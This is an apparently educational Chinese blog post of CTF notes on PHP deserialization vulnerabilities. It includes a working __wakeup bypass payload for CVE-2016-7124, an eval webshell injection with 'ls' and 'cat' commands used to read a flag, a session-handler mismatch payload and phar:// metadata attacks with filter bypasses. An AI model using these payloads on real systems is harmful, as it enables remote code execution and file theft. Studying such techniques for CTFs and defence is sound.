---
title: PHP反序列化漏洞总结
date: 2019-05-12 21:46:37
comments: true
toc: true
categories:
- CTF
tags:
- php反序列化
---

### 1、什么是序列化
序列化与反序列化我们可以很方便的在PHP中进行对象的传递。本质上反序列化是没有危害的。但是如果用户对数据可控那就可以利用反序列化构造payload攻击

### 2、序列化相关函数
serialize、unserialize，以及在序列化和反序列化过程中自动执行的魔术方法，具体有：

```php
__construct()//创建对象时触发
__destruct() //对象被销毁时触发
__call() //在对象上下文中调用不可访问的方法时触发
__callStatic() //在静态上下文中调用不可访问的方法时触发
__get() //用于从不可访问的属性读取数据
__set() //用于将数据写入不可访问的属性
__isset() //在不可访问的属性上调用isset()或empty()触发
__unset() //在不可访问的属性上使用unset()时触发
__invoke() //当脚本尝试将对象调用为函数时触发
```
经常会用到且比较重要的函数：

***__sleep()函数：***
对象被序列化之前触发，返回需要被序列化存储的成员属性，删除不必要的属性。
```PHP
public function __sleep(){
        echo __METHOD__ . '<br>';
        return ['ID', 'sex', 'age'];
}
```
返回只需要序列化的三个属性

***\__wakeup()：***
unserialize() 会检查是否存在一个 \__wakeup() 方法。如果存在，则会先调用 \__wakeup 方法，预先准备对象需要的资源。预先准备对象资源，返回void，常用于反序列化操作中重新建立数据库连接或执行其他初始化操作。

***__toString()：***
\__toString() 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示什么样的内容。

```php
 public function __toString(){
        return $this->info;
 }
```
比如只想返回对象的info属性

### 3、 简单案例
```php
<?php
class SerializeTest
{
    private $flag = "flag{th15_tru3_f1a9}";
    private $file = "test.php";
    public function __construct(){
        file_put_contents($this->file, $this->flag);
    }

    public function __wakeup(){
        echo $this->flag;
    }
}
$test = new SerializeTest();
$temp = serialize($test);
echo $temp . '<br>';
$me = unserialize($temp);
```
输出：
O:13:"SerializeTest":2:{s:19:" SerializeTest flag";s:20:"flag{th15_tru3_f1a9}";s:19:" SerializeTest file";s:8:"test.php";}

O: 代表对象  13代表对象所属类的字符表示

:2: 代表具有两个序列化的属性，分别是SerializeTest flag和SerializeTest file，后面的内容对应的是值

### 4、题目实战

#### 4.1 绕过\__wakeup()方法

第一步和第二步都比较简单的可以绕过
关键是第三步，看关键的代码
```php
<?php 
class Demo { 
    private $file = 'Gu3ss_m3_h2h2.php'; 
    public function __construct($file) { 
        $this->file = $file; 
    } 
    function __destruct() { 
        echo @highlight_file($this->file, true); 
    } 
    function __wakeup() { 
        if ($this->file != 'Gu3ss_m3_h2h2.php') { 
            //the secret is in the f15g_1s_here.php 
            $this->file = 'Gu3ss_m3_h2h2.php'; 
        } 
    } 
} 
if (isset($_GET['var'])) { 
    $var = base64_decode($_GET['var']); 
    if (preg_match('/[oc]:\d+:/i', $var)) { 
        die('stop hacking!'); 
    } else { 
        @unserialize($var); 
    } 
} else { 
    highlight_file("Gu3ss_m3_h2h2.php"); 
} ?>
```
第一步是要绕过正则表达式的判断，preg_match('/[oc]:\d+:/i', $var)，这里绕过正则的方式是在O的后面的加上+号

比如形如这样的序列化：O:+6:"sercet":1:{s:12:" sercet file";s:12:"the_next.php";}

第二是要绕过\__wakeup()对$file对象的赋值

问题是如何绕过\__weakup 百度一下  发现这是一个CVE漏洞 ==》当成员属性数目大于实际数目时可绕过wakeup方法(CVE-2016-7124)

类似这样的payload：O:+6:"sercet":2:{s:12:" sercet file";s:12:"the_next.php";}

***所以构造payload:***
```php
$demo = new Demo('f15g_1s_here.php');
$va = serialize($demo);
$a1 = str_replace('O:4', 'O:+4', $va);
$a1 = str_replace(':1:', ':7:', $a1);
echo base64_encode($a1);

O:+4:"Demo":2:{S:10:"\00Demo\00file";s:16:"f15g_1s_here.php";}
```
/Gu3ss_m3_h2h2.php?var=TzorNDoiRGVtbyI6Nzp7czoxMDoiAERlbW8AZmlsZSI7czoxNjoiZjE1Z18xc19oZXJlLnBocCI7fQ==

得到f15g_1s_here.php的代码：
```php
<?php 
if (isset($_GET['val'])) { 
    $val = $_GET['val']; 
    eval('$value="' . addslashes($val) . '";'); 
} else { 
    die('hahaha!'); 
} 
?>
```
http://7fd6cef3296344adb135503e375b83210f41ea6ac1df44e8.game.ichunqiu.com//f15g_1s_here.php?val=${@eval($_POST[0])}

POST请求：0=echo \`ls\`;

Gu3ss_m3_h2h2.php True_F1ag_i3_Here_233.php f15g_1s_here.php index.php

执行：
0=echo \`cat True_F1ag_i3_Here_233.php\`;

#### 4.2 session反序列化漏洞

首先我们需要了解session反序列化是什么？
PHP在session存储和读取时,都会有一个序列化和反序列化的过程，PHP内置了多种处理器用于存取 $_SESSION 数据，都会对数据进行序列化和反序列化
在php.ini中有以下配置项，wamp的默认配置如图
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200223213850436.png)

配置项	| 说明
-|-|
session.save_path	| 设置session的存储路径
session.save_handler 	| 设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)
session.auto_start	| 指定会话模块是否在请求开始时启动一个会话,默认为0不启动
session.serialize_handler	| 定义用来序列化/反序列化的处理器名字。默认使用php

反序列化引擎|	对应的存储格式
-|-|
php	| 键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值
php_binary 	| 键名的长度对应的ASCII字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值
php_serialize	| 经过 serialize() 函数反序列处理的数组

三种序列化引擎反序列化样例：

序列化引擎	| 对应的存储格式
-|-|
php	| 键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值
php_binary 	| 键名的长度对应的ASCII字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值
php_serialize	| 经过 serialize() 函数反序列处理的数组

在PHP中默认使用的是PHP引擎，如果要修改为其他的引擎，只需要添加代码ini_set('session.serialize_handler', '需要设置的引擎');。
示例代码如下：
```php
1	<?php
2	ini_set('session.serialize_handler', 'php_serialize');
3	session_start();
4	// do something
```

php中的session中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项session.save_handler来进行确定的，默认是以文件的方式存储。存储的文件是以sess_sessionid来进行命名的，文件的内容就是session值的序列话之后的内容。
不同序列化引擎最终的存储结果如下，以以下代码为例进行说明：
```php
1	<?php
2	ini_set('session.serialize_handler', 'XXXX指定序列化引擎');
3	session_start();
4	$_SESSION['name'] = 'hahaha';
5	var_dump();
6	?>
```

序列化引擎 | 	对应的存储形式
-|-|
php	| name|s:6:"hahaha"；其中name是键值，s:6:"hahaha";是serialize("hahaha")的结果
php_binary 	| names:6:"hahaha"；由于name的长度是4，4在ASCII表中对应的就是EOT。根据php_binary的存储规则，最后就是names:6:"hahaha";（ASCII的值为4的字符无法在网页上面显示）
php_serialize	| SESSION文件的内容是a:1:{s:4:"name";s:6:"hahaha";}。a:1是使用php_serialize进行序列化时都会加上，表示只有一个键值对。同时使用php_serialize会将session中的key和value都会进行序列化。

**Session 反序列化利用点:**
PHP在反序列化存储的$_SESSION数据时使用的引擎和序列化使用的引擎不一样，会导致数据无法正确第反序列化。通过精心构造的数据包，就可以绕过程序的验证或者是执行一些系统的方法

假设存在s1.php和s2.php，2个文件所使用的SESSION的引擎不一样，就形成了一个漏洞、s1.php，使用php_serialize来处理session
```php
1	<?php
2	ini_set('session.serialize_handler', 'php_serialize');
3	session_start();
4	$_SESSION["spoock"]=$_GET["a"];

us2.php,使用php来处理session
1	ini_set('session.serialize_handler', 'php');
2	session_start();
3	class lemon {
4	        var $hi;
5	        function __construct(){
6	                $this->hi = 'phpinfo();';
7	        }
8	        function __destruct() {
9	                eval($this->hi);
10	        }
11	}
12
```
当访问s1.php时，提交如下的数据：
```php
1	localhost/s1.php?a=|O:5:"lemon":1:{s:2:"hi";s:14:"echo "spoock";";}
```
此时传入的数据会按照php_serialize来进行序列化。此时访问us2.php时，页面输出，spoock成功执行了我们构造的函数。因为在访问us2.php时，程序会按照php来反序列化SESSION中的数据，此时就会反序列化伪造的数据，就会实例化lemon对象，最后就会执行析构函数中的eval()方法。

**相关的CTF题**
* LCTF-2018 bestphp's revenge
* https://www.anquanke.com/post/id/164569
* 安恒杯-Session反序列化

#### 4.3 phar伪协议反序列化
利用phar文件会以序列化的形式存储用户自定义的meta-data这一特性，拓展了php反序列化漏洞的攻击面。该方法在文件系统函数（file_exists()、is_dir()等）参数可控的情况下，配合phar://伪协议，可以不依赖unserialize()直接进行反序列化操作。

**phar文件结构**

||
-|-|
A stub |	可以理解为一个标志，格式为xxx<?php xxx; __HALT_COMPILER();?>，前面内容不限，但必须以__HALT_COMPILER();?>来结尾，否则phar扩展将无法识别这个文件为phar文件。
A manifest describing the contents |	phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。
The file contents | 	被压缩文件的内容
A signature for verifying Phar integrity |	签名，放在文件末尾

生成phar文件的示例代码：（注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件）
```php
<?php
class PharDemo{
    private $message;
    public function __construct($msg){
        $this->message = $msg;
    }
    function __destruct(){
        echo $this->message;
    }
}
$phar = new Phar("phar.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
$o = new PharDemo("oh oh oh !!!");
$phar->setMetadata($o); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
```
生成的phar文件内容为：

![在这里插入图片描述](https://img-blog.csdnimg.cn/2020022321474443.png)

有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200223214757564.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RhaWRlMjAxMg==,size_16,color_FFFFFF,t_70)

```php
<?php
class PharDemo{
    private $message;
    public function __construct($msg){
        $this->message = $msg;
    }
    function __destruct(){
        echo $this->message;
    }
}
$filename = 'phar://phar.phar/test.txt';
//file_get_contents($filename);
file_exists($filename);
```
结果输出：oh oh oh !!! 说明成功进行了反序列化

有时候对传入的参数进行了一些过滤，把 phar:// 开头的直接 过滤了，也就是我要求你要用另外的反序列化的方式，这种方式不能使用 phar:// 开头，我们可以使用的是 compress.zlib://phar://xxxx 这种方式进行绕过过滤

**相关的CTF题**

* LCTF-2018 T4lk 1s ch34p,sh0w m3 the sh31l
* https://paper.seebug.org/680/
* http://www.k0rz3n.com/2018/11/19/LCTF%202018%20T4lk%201s%20ch34p,sh0w%20m3%20the%20sh31l%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/

参考文献

【1】https://blog.spoock.com/2016/10/16/php-serialize-problem/
